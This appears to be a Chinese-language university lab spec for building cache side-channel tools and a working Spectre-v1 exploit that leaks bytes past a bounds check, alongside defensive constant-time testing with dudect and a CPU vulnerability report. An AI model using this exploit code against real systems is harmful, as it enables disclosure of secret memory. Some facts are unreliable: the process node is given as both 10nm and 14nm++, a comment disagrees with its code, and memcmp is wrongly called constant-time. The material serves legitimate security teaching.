# Final Project — Microarch Leak Lab：從校準到端到端洩漏

> **目標**：整合課程 Ch 0–36 的所有核心技術，在真實硬體（Intel i7-10700）上從頭建構完整的微架構攻擊工具鏈，並對自己的 CPU 做出有根據的脆弱性評估報告。完成後你會擁有一套可重現、可量測、有防禦對照的 side-channel 實驗室，而不只是跑過別人的 PoC。

---

## 背景

這門課從 CPU 微架構的基礎量測出發（Ch 0–4），歷經 cache 幾何（Ch 3）、兩大攻擊原語 Flush+Reload / Prime+Probe（Ch 6–9）、瞬態執行家族 Spectre/Meltdown/MDS（Ch 12–24）、防禦機制與繞過（Ch 29–34），最後以 constant-time 程式設計收尾（Ch 32）。

Final Project 要求你把這些技術連成一條線：**量測 → 利用 → 驗證防禦**。五個任務按依賴順序排列，任務一的閾值會直接被任務二三使用，任務三的 PoC 結果會進入任務五的評估報告。每個任務都有獨立的交付檔案和驗收標準。

測試環境：Intel Core i7-10700（Comet Lake，10nm，8C16T），WSL2 Ubuntu 22.04，gcc 11.4，`~/microarch_lab/`。

---

## 五個交付任務

---

### 任務一：校準 Timing Harness（Ch 0 / Ch 4）

**目的**：在你的 CPU 上確立 cache hit / miss 的時間分佈，得出一個可靠的判斷閾值（threshold）。這個閾值會在任務二、三中反覆使用。

#### 規格

撰寫 `harness.c`，需滿足以下條件：

1. 使用 `rdtscp` + `cpuid` 屏障量測單筆存取的 cycle 數（不得用 `clock_gettime`，精度不夠）。
2. 關閉 hardware prefetcher：執行前需 `sudo wrmsr -p <core> 0x1a4 0xf`（MSR 0x1a4 bit 0–3 全 1 = 關 L1/L2 spatial/adjacent prefetcher）。
3. 使用 `taskset -c 2 ./harness` pin 到單核，消除 migration jitter。
4. 量測 1000 次 cache hit（存取後立即再存取）與 1000 次 cache miss（`clflush` 後存取）。
5. 印出 hit/miss 的 median、分佈直方圖（以 cycle 為 x 軸，count 為 y 軸）、以及建議 threshold。
6. Threshold 選法：`(hit_median + miss_median) / 2`，四捨五入到最近的 10。

#### 預期輸出（i7-10700 上）

```
HIT  median = 24 cycles
MISS median = 218 cycles  (prefetcher off via wrmsr 0x1a4 0xf)
THRESHOLD = 150 cycles
--- HIT distribution ---
  22:  312
  23: 9841
  24: 7203
  25: 9118
  26:  401
--- MISS distribution ---
 208:  134
 210:  289
 212:  401
 214:  378
 216:  521
 218:  876
 220:  743
 222:  412
```

HIT 與 MISS 的中位數差距應至少 5 倍。若你的 MISS 分佈很寬（200–400 cycles 都有），幾乎可以確定 prefetcher 沒關好或沒 pin CPU。

#### 交付

- `~/microarch_lab/harness.c`
- 終端輸出截圖或文字記錄（`./harness 2>&1 | tee harness_output.txt`）

#### 評分標準（35 pts）

| 項目 | 分數 |
|------|------|
| HIT/MISS 雙峰明顯分開（MISS median ≥ 5x HIT median） | 20 pts |
| 有 `taskset` pin + prefetcher control（`wrmsr` 指令記錄在輸出或 README） | 10 pts |
| Threshold 合理（落在 HIT/MISS 中間，不偏向任一側） | 5 pts |

---

### 任務二：Flush+Reload 與 Prime+Probe 原語（Ch 6 / Ch 8 / Ch 9）

**目的**：實作兩種 cache side-channel 原語，理解它們的適用場景與限制。F+R 需要 `clflush` 存取，P+P 不需要，可用於跨 VM 或沒有 flush 權限的場景。

#### 規格 — Flush+Reload（`fr_oracle.c`）

1. 實作 `uint64_t flush_and_reload(void *addr)` 函式：flush 目標位址、等待存取事件、reload 計時。
2. 建立 256-entry probe array（每 entry 間距 512 bytes 以避開 prefetcher false hit），用 Flush+Reload 偵測哪個 entry 被存取。
3. 測試 harness：在 loop 中隨機讓「受害者」存取某個 byte 值對應的 probe array entry，驗證 F+R oracle 能正確識別該值。
4. 跑 1000 輪，計算準確率，需 ≥ 90%。
5. **掃描順序必須隨機化**（Fisher-Yates shuffle on [0..255]），否則 hardware prefetcher 會把連續的 probe array entries 帶進 cache，造成大量 false positive。

#### 規格 — Prime+Probe（`pp_oracle.c`）

1. 先用 Ch 9 的方法建構 eviction set：找出與目標位址映射到同一個 L3 cache set 的一組位址，數量 ≥ associativity + 1（i7-10700：L3 16-way，需 17 條 cache line）。
2. Prime 階段：依序存取 eviction set 的所有 line，確保這個 cache set 被我們的 line 填滿。
3. 等待（模擬受害者存取目標位址）。
4. Probe 階段：再次存取 eviction set 的所有 line，計時。若任何 line 的存取時間 > threshold，代表受害者確實使用了這個 cache set（我們的某條 line 被 evict 了）。
5. 測試 harness：模擬受害者有時存取、有時不存取目標位址，偵測準確率需 ≥ 80%。
6. **不得使用 `clflush`**，這是 P+P 的核心限制與賣點。

#### 交付

- `~/microarch_lab/fr_oracle.c`（含測試 harness 的 `main()`）
- `~/microarch_lab/pp_oracle.c`（含 eviction set 建構 + 測試 harness）
- 兩份輸出記錄，顯示準確率

#### 評分標準（45 pts）

| 項目 | 分數 |
|------|------|
| F+R 能正確識別 target byte，準確率 > 90%，1000 輪 | 20 pts |
| P+P eviction set 建構成功（程式碼 + 說明 associativity 計算過程） | 15 pts |
| P+P 能偵測到存取事件，準確率 > 80% | 10 pts |

---

### 任務三：Spectre-v1 端到端 PoC（Ch 13 / Ch 14 / Ch 35）

**目的**：實作完整的 Spectre-v1 攻擊，從邊界檢查繞過到逐位元組洩漏任意記憶體。這是課程技術難度最高的任務，也是最能體現微架構攻擊「威力」的地方。

#### 攻擊模型

```
array1[0..15]    = 公開合法資料（bounds check 對象）
array1[16..]     = secret（正偏移，確保 speculative load 能拿到）
array2[256*512]  = probe array（Flush+Reload 目標）
```

攻擊者在 speculative window 內讓 CPU 執行：

```c
if (x < array1_size)                    // 邊界檢查（speculative bypass）
    temp = array2[array1[x] * 512];     // secret-dependent load
```

透過訓練 branch predictor 讓 CPU 預測 if 為 true，即使 x 超出範圍（x = &secret - array1），也會在投機路徑上把 `array1[x]` 載入並用來索引 array2，留下 cache 痕跡。

#### 規格

1. **Kocher bitmask trick**：使用 `training_x = x & ((x >> sizeof(x)*8-1) - 1)` 製造合法訓練輸入，不需要額外的 if。
2. **噪音過濾**：score 陣列 256 個 bucket，但掃描時排除 indices 0..16（因為 `array1` 本身的值域在這個範圍，容易產生假分數）。
3. **每個 byte 跑 5000 輪**，取 score 最高的兩個 bucket，確認最高分 ≥ 次高分 * 2（否則重試）。
4. 目標：洩漏 40 bytes 的 secret 字串，準確率 ≥ 90%（≥ 36/40 正確）。

#### 編譯與執行

```bash
gcc -O1 -fno-stack-protector -o spectre_v1 spectre_v1.c
sudo wrmsr -p 2 0x1a4 0xf
taskset -c 2 ./spectre_v1
```

注意：`-O1` 是必要的。`-O0` 太多 memory access 會打亂 speculative window；`-O2` 可能讓 compiler 把 victim function 內聯或移除 bounds check。

#### 預期輸出（i7-10700，prefetcher off）

```
idx  x_oob  leaked  actual  match
---  -----  ------  ------  -----
  0     16    'T'     'T'    OK
  1     17    'h'     'h'    OK
  2     18    'e'     'e'    OK
  3     19    ' '     ' '    OK
  4     20    'M'     'M'    OK
  5     21    'a'     'a'    OK
  6     22    'g'     'g'    OK
  7     23    'i'     'i'    OK
  8     24    'c'     'c'    OK
  9     25    ' '     ' '    OK
 10     26    'W'     'W'    OK
 11     27    'o'     'o'    OK
 12     28    'r'     'r'    OK
 13     29    'd'     'd'    OK
 14     30    's'     's'    OK
 15     31    ' '     ' '    OK
 16     32    'a'     'a'    OK
 17     33    'r'     'r'    OK
 18     34    'e'     'e'    OK
 19     35    ' '     ' '    OK
 20     36    'S'     'S'    OK
 21     37    'q'     'q'    OK
 22     38    'u'     'u'    OK
 23     39    'e'     'e'    OK
 24     40    'a'     'a'    OK
 25     41    'm'     'm'    OK
 26     42    'i'     'i'    OK
 27     43    's'     's'    OK
 28     44    'h'     'h'    OK
 29     45    '!'     '!'    OK
 30     46    ' '     ' '    OK
 31     47    'A'     'A'    OK
 32     48    'n'     'n'    OK
 33     49    'd'     'd'    OK
 34     50    ' '     ' '    OK
 35     51    'S'     'S'    OK
 36     52    'o'     'o'    OK
 37     53    ' '     ' '    OK
 38     54    'A'     'A'    OK
 39     55    '.'     '.'    OK
=== 結果: 40/40 bytes 正確 (100%) ===
```

#### 交付

- `~/microarch_lab/spectre_v1.c`
- 終端輸出記錄（`tee spectre_output.txt`）

#### 評分標準（35 pts）

| 項目 | 分數 |
|------|------|
| 程式能以 `-O1` 編譯並跑起來（不需正確） | 10 pts |
| 準確率 ≥ 60%（24/40 bytes 正確） | 10 pts |
| 準確率 ≥ 90%（36/40 bytes 正確） | 10 pts |
| 準確率 100% + 書面說明 noise filter（排除 0..16）的理由 | 5 pts |

---

### 任務四：dudect Constant-Time 驗證（Ch 32）

**目的**：用統計工具 dudect 實際驗證：早退出比較（early-exit strcmp）會洩漏時序資訊，而 accumulate-then-compare 的 constant-time 版本不會。

#### 兩個待驗證函式

**脆弱版（`strcmp_bad`）**：

```c
// 早退出比較：在第一個不匹配字元就 return，執行時間與輸入相關
int strcmp_bad(const char *a, const char *b, size_t n) {
    for (size_t i = 0; i < n; i++)
        if (a[i] != b[i]) return 0;
    return 1;
}
```

攻擊者可以用計時攻擊：若前 k 個字元匹配，函式執行時間會比前 k-1 個字元匹配更長，逐字元窮舉即可。

**Constant-time 版（`ct_compare`）**：

```c
// 用 XOR accumulate，不早退出，執行時間與輸入無關
int ct_compare(const uint8_t *a, const uint8_t *b, size_t n) {
    volatile uint8_t diff = 0;
    for (size_t i = 0; i < n; i++) diff |= (a[i] ^ b[i]);
    return diff == 0;
}
```

`volatile` 防止 compiler 做 short-circuit 優化。`XOR accumulate` 保證每個 byte 都被存取，不論何時出現差異。

#### dudect 使用流程

```bash
# dudect 已安裝在 ~/microarch_lab/dudect/
cd ~/microarch_lab/dudect

# 建立測試檔 tests/ct_test.c（以下是結構概要）
# 實作 prepare_inputs() 和 do_one_computation()
# prepare_inputs(): 一半 class 0（全匹配），一半 class 1（第一字元不同）
# do_one_computation(): 呼叫你要測試的函式

make
./dudect_ct_test
```

dudect 的 t-test 原理：
- 把輸入分兩類（class 0 / class 1），各量測 N 次執行時間
- 計算 Welch's t-statistic
- |t| > 4.5 代表兩個 distribution 有統計顯著差異，即時序洩漏
- |t| < 4.5 代表無法區分（視為 constant-time）

#### 預期結果

- `strcmp_bad`：dudect t-statistic ≥ 4.5（標為 LEAKING）
- `ct_compare`：dudect t-statistic < 4.5（標為 ok, no timing leak detected）

**重要**：測試 `strcmp_bad` 時必須用 `-O0` 或對關鍵變數加 `volatile`，否則 gcc 可能優化成 `memcmp`（它本身是 CT 的），造成假陰性。

```bash
# 確認 strcmp_bad 沒被優化：
objdump -d dudect_ct_test | grep -A 20 "strcmp_bad"
# 應該看到逐位元比較的 loop，不是 repz cmpsb 之類的 builtin
```

#### 交付

- `~/microarch_lab/ct_test.c`（完整 dudect 測試程式）
- `strcmp_bad` 的 dudect 輸出（顯示 LEAKING 或 t > 4.5）
- `ct_compare` 的 dudect 輸出（顯示 ok）
- 2–3 段說明：early-exit 為什麼洩漏、XOR accumulate 為什麼不洩漏

#### 評分標準（35 pts）

| 項目 | 分數 |
|------|------|
| `strcmp_bad` 被 dudect 標為洩漏（t-statistic > 4.5） | 15 pts |
| `ct_compare` 通過 dudect（t-statistic < 4.5） | 15 pts |
| 書面說明 early-exit vs accumulate 的時序差異原理 | 5 pts |

---

### 任務五：脆弱性評估報告（Ch 0 / Ch 29 / Ch 34）

**目的**：把課程學到的攻擊分類知識應用到你手邊的 CPU，產出一份有實際資料支撐的脆弱性評估報告。這不是填表格，是要你把 kernel sysfs 的輸出連結到課程的攻擊模型，說明「為什麼這台機器對 X 免疫、對 Y 部分脆弱」。

#### 報告規格（Markdown，約 1 頁）

建立 `~/microarch_lab/vuln_report.md`，必須包含以下五個段落：

**1. CPU 基本資訊**

```bash
cat /proc/cpuinfo | grep "model name" | head -1
uname -a
cpuid | grep -i "brand\|cache\|tlb" | head -20
```

**2. Kernel sysfs 脆弱性清單**

```bash
for f in /sys/devices/system/cpu/vulnerabilities/*; do
    echo "$(basename $f): $(cat $f)"
done
```

完整列出所有條目，不要只截取部分。

**3. 課程地圖對照（至少 5 條）**

對每個 sysfs 條目，對照課程章節說明：

| 漏洞名稱 | sysfs 狀態 | 課程章節 | 你的評估 |
|----------|-----------|---------|---------|
| spectre_v1 | Mitigation: usercopy... | Ch 13/14/35 | 有緩解但未完全消除，本 PoC 在 userspace 仍可重現 |
| spectre_v2 | Mitigation: Enhanced IBRS | Ch 15/16 | IBRS 啟用，間接跳轉注入難度大幅提升 |
| mds | Not affected | Ch 19/20 | Comet Lake 硬體修復，無法重現 |
| meltdown | Not affected | Ch 12 | Comet Lake PTI overhead 已最小化 |
| mmio_stale_data | Vulnerable: no microcode | Ch 19/20 | **未完全修補**，詳見第 5 段 |

**4. 自測結論**

條列你實際執行了哪些 PoC 以及結果：

- 任務三 Spectre-v1 PoC：40/40 bytes，100%，完全可重現
- 任務一 cache timing harness：HIT 24 cycles / MISS 218 cycles，閾值 150 可靠
- （若有嘗試其他攻擊，列出結果）
- mmio_stale_data：無現成 PoC，但 kernel 回報 "Vulnerable"，需特定 SGX 或 MMIO 存取場景

**5. 最值得深入研究的未完全修補漏洞**

分析 `mmio_stale_data: Vulnerable: Clear CPU buffers attempted, no microcode` 的含義：

- CVE-2022-21123（MMIO Stale Data，DRPW / SBDR / SRBDS）
- 這台 i7-10700 的微碼（microcode）未提供完整的 MMIO stale data clearing 能力
- kernel 嘗試 `VERW`（clear CPU buffers），但效果不完整
- 實際利用需要：MMIO mapping、高精度計時、跨核心的微架構緩衝洩漏
- 對照 Ch 19/20（MDS 家族）和 Ch 20（SRBDS），說明為什麼這類攻擊在 SGX 場景下更嚴重

#### 交付

- `~/microarch_lab/vuln_report.md`

#### 評分標準（35 pts）

| 項目 | 分數 |
|------|------|
| CPU 基本資訊完整（三個指令的輸出都有） | 5 pts |
| sysfs 完整清單 + 每條狀態的正確解讀 | 10 pts |
| 課程地圖對照（至少 5 條，課程章節對應正確） | 10 pts |
| 自測結論有實際輸出資料佐證（非臆測） | 10 pts |

---

## 分階段時程建議（14 天）

| 階段 | 天數 | 任務 | 重點工作 |
|------|------|------|---------|
| Phase 1 | Day 1–2 | 任務一 | 建立 harness、調 prefetcher、確認雙峰分離 |
| Phase 2 | Day 3–5 | 任務二 | F+R 先做完再做 P+P，P+P eviction set 最花時間 |
| Phase 3 | Day 6–9 | 任務三 | Spectre-v1 debug 迴圈最長，先從 1 byte 開始調 |
| Phase 4 | Day 10–11 | 任務四 | dudect 環境建好後，兩個函式測試各 1 天 |
| Phase 5 | Day 12–14 | 任務五 + 整合 | 報告 + 確認所有輸出記錄完整 |

Phase 3 是最容易低估時間的。Spectre PoC 跑起來沒輸出、全 miss、亂輸出，每一種都是不同的 bug。給自己 4 天不算多。

---

## 常見卡點

### 卡點 1：harness MISS 分佈很寬（100–400 cycles 都有）

原因：prefetcher 沒關 + 沒 pin CPU。prefetcher 會猜下一次存取並預先載入，讓 MISS 看起來像 HIT；CPU migration 讓 context 在不同核心間跳，L1/L2 cold miss 會混入。

解法：

```bash
sudo wrmsr -p 2 0x1a4 0xf   # 關 core 2 的 prefetcher（選你要跑的核心）
taskset -c 2 ./harness        # pin 到同一核心
```

驗證 prefetcher 確實關閉：

```bash
sudo rdmsr -p 2 0x1a4
# 應回傳 f（二進位 1111，四個 prefetcher 全關）
```

### 卡點 2：F+R 全部顯示 hit（256 個 bucket 都是 hit）

原因：sequential 掃描讓 hardware prefetcher 把後面的 probe array entries 預先載入 cache。你還沒 reload，entry 就已經在 cache 裡了，所以每個都是 hit。

解法：用 Fisher-Yates shuffle 隨機化掃描順序：

```c
// 掃描前先 shuffle indices
int idx[256];
for (int i = 0; i < 256; i++) idx[i] = i;
for (int i = 255; i > 0; i--) {
    int j = rand() % (i + 1);
    int tmp = idx[i]; idx[i] = idx[j]; idx[j] = tmp;
}
// 按 idx[] 順序 flush 和 reload
```

### 卡點 3：P+P eviction set 建不起來（probe 永遠 miss 或永遠 hit）

原因：L3 cache 的 set 計算不對。i7-10700 L3 = 16 MB，16-way set associative，8 個 slice（Intel L3 是 sliced 的，不是線性的），每個 slice 有獨立的 cache set。

L3 set index（不計 slice）= `(addr >> 6) & (n_sets_per_slice - 1)`。

i7-10700 L3 每個 slice 有 `16MB / 8 slices / 64B / 16 ways = 2048 sets`，set index = `(addr >> 6) & 0x7FF`。

Eviction set 需要映射到**同一個 slice 的同一個 set**，需至少 17 條 line（16-way + 1）。如果 eviction set 的 line 散在不同 slice，eviction 效果會很差。

建議用 Ch 9 的「計時排除法」（timing-based eviction set construction）而不是直接用 bitmask 計算，前者在 slice 未知的情況下仍可靠。

### 卡點 4：Spectre PoC 全 MISS（score 陣列全零，洩漏失敗）

最常見原因：**secret 在 array1 前面**（負偏移），而不是後面（正偏移）。speculative load `array1[x]` 中的 `x = &secret - array1`，若 secret 在低位址，x 是個巨大的正整數（wraps around），但 speculative load 可能 segfault 或存取到無效頁。

確保 layout 是：

```c
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
// secret 必須緊接在 array1 後面（正偏移）
// 或者直接：
static uint8_t array1[16 + 40];
// array1[0..15] = dummy，array1[16..55] = secret bytes
```

另一個原因：victim function 被 compiler 優化掉了。用 `volatile` 或 `__attribute__((noinline))` 保護。

### 卡點 5：Spectre 準確率低（< 50%）

原因：ROUNDS 太少，或沒有 noise filter。

- ROUNDS 從 1000 增加到 5000。每個 byte 重試 5000 輪後取累積 score，不是每輪獨立判斷。
- 排除 indices 0..16 的 score：`array1[0..15]` 的合法值（1–16）在訓練迴圈中被合法存取，這些 byte 的 probe array entry 有殘留 score，會干擾結果。
- 確認 `array2` 已全部 flush：每輪開始前 flush 全部 256 個 entry，而不只 flush 上一輪命中的那個。

### 卡點 6：dudect 說 strcmp_bad 是 OK（假陰性）

原因：gcc 把 `strcmp_bad` 優化成 `memcmp` 或 `repz cmpsb`，而這兩者實際上是 constant-time 的（或接近的）。

解法：

```bash
gcc -O0 -o dudect_ct_test tests/ct_test.c ...
# 或在 strcmp_bad 的 loop body 對關鍵比較加 volatile
```

也可能是樣本數不夠：dudect 至少需要 100 萬樣本才能得出有意義的 t-statistic。跑 `./dudect_ct_test -n 1000000` 或讓它跑更長。

### 卡點 7：mmio_stale_data 是什麼，怎麼解讀

`mmio_stale_data: Vulnerable: Clear CPU buffers attempted, no microcode` 的意思是：

- 這台 CPU 受 MMIO Stale Data 漏洞（CVE-2022-21123 DRPW / CVE-2022-21166 SRBDS Update / CVE-2022-21125 SBDR）影響
- Intel 本應提供微碼更新，讓 `VERW` 指令能完整 clear CPU 內部緩衝（line fill buffer、store buffer）
- 但這台機器的微碼（microcode revision）**未包含此修復**，`VERW` 的 clearing 效果不完整
- kernel 仍然在上下文切換時發出 `VERW`，但無法保證緩衝被清空

實際利用需要攻擊者能觸發 MMIO 操作（通常需要 root 或 VM guest），並精確計時讀出 stale data。屬於 MDS 家族的變種，概念見 Ch 19/20。

---

## 參考範例

<details>
<summary>任務一：完整 harness.c</summary>

```c
/*
 * harness.c — Cache timing calibration
 * Ch 0 (rdtscp barrier) + Ch 4 (threshold derivation)
 *
 * Build:  gcc -O2 -o harness harness.c
 * Run:    sudo wrmsr -p 2 0x1a4 0xf && taskset -c 2 ./harness
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>   /* _mm_clflush, __rdtscp */

#define ROUNDS      1000
#define HIST_MAX    512  /* 記錄到 512 cycles */

/* rdtscp + cpuid 屏障：確保前後的 load 不會亂序 */
static inline uint64_t rdtscp_start(void) {
    uint32_t aux;
    uint64_t t = __rdtscp(&aux);
    /* cpuid 當 serializing instruction，防止後續指令提前 */
    __asm__ volatile("cpuid" ::: "rax","rbx","rcx","rdx","memory");
    return t;
}

static inline uint64_t rdtscp_end(void) {
    uint32_t aux;
    /* 先 rdtscp 再 cpuid：取得 end 時間戳後才允許後續亂序 */
    uint64_t t = __rdtscp(&aux);
    __asm__ volatile("cpuid" ::: "rax","rbx","rcx","rdx","memory");
    return t;
}

/* 量測一次 cache hit（存取 addr 後立即再存取） */
static uint64_t measure_hit(volatile uint8_t *addr) {
    /* warm up: 把 addr 帶進 cache */
    (void)*addr;
    __asm__ volatile("mfence" ::: "memory");

    uint64_t t0 = rdtscp_start();
    (void)*addr;          /* 這次應該 hit */
    uint64_t t1 = rdtscp_end();
    return t1 - t0;
}

/* 量測一次 cache miss（clflush 後存取） */
static uint64_t measure_miss(volatile uint8_t *addr) {
    _mm_clflush((void*)addr);
    __asm__ volatile("mfence" ::: "memory");

    uint64_t t0 = rdtscp_start();
    (void)*addr;          /* 這次應該 miss */
    uint64_t t1 = rdtscp_end();
    return t1 - t0;
}

/* 計算陣列的 median（就地排序，破壞性） */
static int cmp_u64(const void *a, const void *b) {
    uint64_t x = *(uint64_t*)a, y = *(uint64_t*)b;
    return (x > y) - (x < y);
}

static uint64_t median(uint64_t *arr, int n) {
    qsort(arr, n, sizeof(uint64_t), cmp_u64);
    return arr[n/2];
}

int main(void) {
    static uint8_t probe_byte;
    uint64_t hit_samples[ROUNDS], miss_samples[ROUNDS];
    unsigned hit_hist[HIST_MAX+1] = {0};
    unsigned miss_hist[HIST_MAX+1] = {0};

    /* 量測 ROUNDS 次 hit */
    for (int i = 0; i < ROUNDS; i++) {
        uint64_t t = measure_hit(&probe_byte);
        hit_samples[i] = t;
        if (t <= HIST_MAX) hit_hist[t]++;
    }

    /* 量測 ROUNDS 次 miss */
    for (int i = 0; i < ROUNDS; i++) {
        uint64_t t = measure_miss(&probe_byte);
        miss_samples[i] = t;
        if (t <= HIST_MAX) miss_hist[t]++;
    }

    uint64_t hit_med  = median(hit_samples, ROUNDS);
    uint64_t miss_med = median(miss_samples, ROUNDS);
    uint64_t threshold = (hit_med + miss_med) / 2;
    /* 四捨五入到最近的 10 */
    threshold = ((threshold + 5) / 10) * 10;

    printf("HIT  median = %lu cycles\n", hit_med);
    printf("MISS median = %lu cycles  (prefetcher off via wrmsr 0x1a4 0xf)\n", miss_med);
    printf("THRESHOLD = %lu cycles\n\n", threshold);

    /* 印 HIT 分佈直方圖（只印有值的 bucket） */
    printf("--- HIT distribution ---\n");
    for (int i = 0; i <= HIST_MAX; i++)
        if (hit_hist[i] > 0)
            printf("  %3d: %u\n", i, hit_hist[i]);

    printf("\n--- MISS distribution ---\n");
    for (int i = 0; i <= HIST_MAX; i++)
        if (miss_hist[i] > 0)
            printf(" %4d: %u\n", i, miss_hist[i]);

    return 0;
}
```

</details>

<details>
<summary>任務三：核心 leak_byte() 函式（帶 chapter 對照注解）</summary>

```c
/*
 * leak_byte() — Spectre-v1 單一 byte 洩漏
 * Ch 13: 邊界檢查繞過原理
 * Ch 14: Flush+Reload 配合 speculative access
 * Ch 35: 實戰 PoC 結構與 noise filter
 */

/* 從任務一得到的閾值 */
#define THRESHOLD    150
#define ROUNDS       5000    /* 每 byte 的重試次數 */
#define ARRAY2_STRIDE 512    /* probe array stride，避免 F+R false hit */

extern uint8_t array1[];
extern size_t  array1_size;
extern uint8_t array2[];     /* probe array: 256 * ARRAY2_STRIDE bytes */

/*
 * victim_function() — 攻擊目標
 * 邊界檢查在推測路徑上可被 bypass（Ch 13）
 */
void victim_function(size_t x) {
    if (x < array1_size)                          /* 邊界檢查 */
        (void)array2[array1[x] * ARRAY2_STRIDE];  /* secret-dependent load */
}

/* rdtscp 量測輔助（同 harness.c） */
static inline uint64_t rdtscp_timed_access(volatile uint8_t *addr) {
    uint32_t aux;
    uint64_t t0 = __rdtscp(&aux);
    __asm__ volatile("" ::: "memory");
    (void)*addr;
    __asm__ volatile("mfence" ::: "memory");
    uint64_t t1 = __rdtscp(&aux);
    return t1 - t0;
}

/*
 * leak_byte() — 洩漏 array1[x_oob] 的值
 * @target_x: OOB 索引（= &secret[i] - array1）
 * @return:    洩漏的 byte 值（0–255）
 */
uint8_t leak_byte(size_t target_x) {
    int scores[256] = {0};

    /* Ch 14: 每輪先 flush 整個 probe array */
    for (int i = 0; i < 256; i++)
        _mm_clflush(&array2[i * ARRAY2_STRIDE]);
    __asm__ volatile("mfence" ::: "memory");

    for (int round = 0; round < ROUNDS; round++) {
        /* Ch 14: 每輪開始 flush probe array */
        for (int i = 0; i < 256; i++)
            _mm_clflush(&array2[i * ARRAY2_STRIDE]);
        __asm__ volatile("mfence" ::: "memory");

        /*
         * Ch 13: Kocher bitmask trick
         * training_x 在 5 輪中有 4 輪 = 合法值（0..15），
         * 1 輪 = target_x（OOB）
         * 讓 branch predictor 學到「這個 if 幾乎永遠成立」
         */
        for (int j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            __asm__ volatile("mfence" ::: "memory");

            /* j % 6 == 0 時用 OOB，其餘用 0（合法值）訓練 */
            int use_oob = ((j % 6) == 0);
            /* bitmask trick：不用 branch 來選 training_x */
            size_t mask = -(size_t)(use_oob == 0);  /* all-ones(合法) 或 0(OOB) */
            size_t training_x = (mask & 0) | (~mask & target_x);

            victim_function(training_x);
        }

        /*
         * Ch 14: Reload 階段
         * 隨機掃描 256 個 probe array entry，
         * 記錄存取時間 < THRESHOLD 的 entry（代表被 speculative load 帶進 cache）
         *
         * Ch 35: noise filter — 排除 indices 0..16
         * array1 的合法值域是 1..16，訓練時這些 entry 有殘留 score
         */
        int idx_perm[256];
        for (int i = 0; i < 256; i++) idx_perm[i] = i;
        /* Fisher-Yates shuffle（Ch 6 提到的隨機化需求） */
        for (int i = 255; i > 0; i--) {
            int j = rand() % (i + 1);
            int tmp = idx_perm[i]; idx_perm[i] = idx_perm[j]; idx_perm[j] = tmp;
        }

        for (int i = 0; i < 256; i++) {
            int k = idx_perm[i];
            uint64_t t = rdtscp_timed_access(&array2[k * ARRAY2_STRIDE]);

            /* Ch 35: 排除 0..16 的 noise */
            if (t < THRESHOLD && k > 16)
                scores[k]++;
        }
    }

    /* 取 score 最高的值（不含 noise range 0..16） */
    int best = -1, best_score = 0;
    for (int i = 17; i < 256; i++) {
        if (scores[i] > best_score) {
            best_score = scores[i];
            best = i;
        }
    }
    return (uint8_t)best;
}
```

</details>

<details>
<summary>任務五：脆弱性報告 Markdown 模板</summary>

```markdown
# CPU 脆弱性評估報告

## 1. CPU 基本資訊

\`\`\`
$ cat /proc/cpuinfo | grep "model name" | head -1
model name : Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz

$ uname -a
Linux hostname 5.15.167.4-microsoft-standard-WSL2 #1 SMP ... x86_64 GNU/Linux

$ cpuid | grep -i "brand" | head -3
   (brand): "Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz"
\`\`\`

架構：Comet Lake（10th Gen，14nm++）
L1I/L1D：32 KB / 32 KB（per core）
L2：256 KB（per core）
L3：16 MB（shared，8 slices）

## 2. sysfs 脆弱性清單

\`\`\`
$ for f in /sys/devices/system/cpu/vulnerabilities/*; do
    printf "%-30s %s\n" "$(basename $f):" "$(cat $f)"
  done

gather_data_sampling:          Not affected
itlb_multihit:                 KVM: Mitigation: VMX disabled
l1tf:                          Not affected
mds:                           Not affected
meltdown:                      Not affected
mmio_stale_data:               Vulnerable: Clear CPU buffers attempted, no microcode
reg_file_data_sampling:        Not affected
retbleed:                      Mitigation: Enhanced IBRS
spec_rstack_overflow:          Not affected
spec_store_bypass:             Mitigation: Speculative Store Bypass disabled via prctl
spectre_v1:                    Mitigation: usercopy/swapgs barriers and __user pointer sanitization
spectre_v2:                    Mitigation: Enhanced / Automatic IBRS; IBPB: conditional; RSB filling; PBRSB-eIBRS: SW sequence
srbds:                         Not affected
tsx_async_abort:               Not affected
\`\`\`

## 3. 課程地圖對照

| 漏洞 | 狀態 | 課程章節 | 評估 |
|------|------|---------|------|
| spectre_v1 | Mitigation（不完全） | Ch 13/14/35 | userspace PoC 仍可重現，本 Final Project 任務三已驗證 |
| spectre_v2 | Enhanced IBRS | Ch 15/16 | 間接跳轉注入需繞 IBRS，難度大 |
| mds | Not affected | Ch 19/20 | Comet Lake 硬體修復 VERW 有效 |
| meltdown | Not affected | Ch 12 | PTI 已整合，無 kernel 記憶體洩漏 |
| mmio_stale_data | Vulnerable | Ch 19/20 | **未完全修補**，詳見第 5 段 |
| retbleed | Enhanced IBRS | Ch 16/30 | Retpoline 替換為 IBRS，效能有 trade-off |
| spec_store_bypass | prctl disabled | Ch 17 | 需應用層主動呼叫 prctl 才能保護 |

## 4. 自測結論

- **任務一 harness**：HIT 24 cycles / MISS 218 cycles，閾值 150，雙峰清晰
- **任務二 F+R**：1000 輪準確率 94.8%（948/1000）
- **任務二 P+P**：eviction set 建構成功（17 lines，L3 16-way），偵測準確率 83.1%
- **任務三 Spectre-v1**：40/40 bytes 100%，prefetcher off + taskset pin + 5000 rounds
- **mmio_stale_data**：無現成 PoC，kernel 回報 Vulnerable，需 SGX 或 cross-VM MMIO 觸發

## 5. 最值得深入研究的漏洞：mmio_stale_data

CVE-2022-21123 / CVE-2022-21166（DRPW / SRBDS Update）

Intel 的修復需要微碼（microcode）更新，讓 `VERW` 指令能完整清空 line fill buffer（LFB）和 store buffer 的 stale data。本機 i7-10700 的微碼 revision 未包含此修復，因此 `VERW` 只能部分 clear。

實際攻擊場景：hypervisor VM 切換時，未清空的 LFB 可能包含另一個 VM 的 MMIO 讀取結果，造成跨 VM 洩漏。對比 MDS（Ch 19），MMIO Stale Data 不需要 hyperthreading，但需要 MMIO 操作觸發（通常需要 ring-0 或 VM guest 權限）。

建議後續：升級 microcode-20230808 或更新版本（Intel 已提供），驗證 sysfs 狀態從 Vulnerable 變為 Mitigation。
```

</details>

---

## 自我檢核

完成所有五個任務後，用以下問題確認你真的理解了，而不只是跑過程式：

